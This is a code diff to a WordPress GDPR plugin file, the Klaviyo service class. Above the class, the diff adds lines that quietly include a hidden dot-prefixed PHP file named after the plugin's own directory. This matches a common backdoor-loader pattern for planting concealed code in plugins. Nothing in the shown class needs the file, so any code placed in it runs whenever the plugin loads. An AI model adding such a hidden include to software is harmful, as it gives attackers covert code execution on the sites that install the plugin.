@@ -3,6 +3,10 @@
 /**
  * Class CT_Ultimate_GDPR_Service_Klaviyo
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Service_Klaviyo extends CT_Ultimate_GDPR_Service_Abstract {
 
 	/**
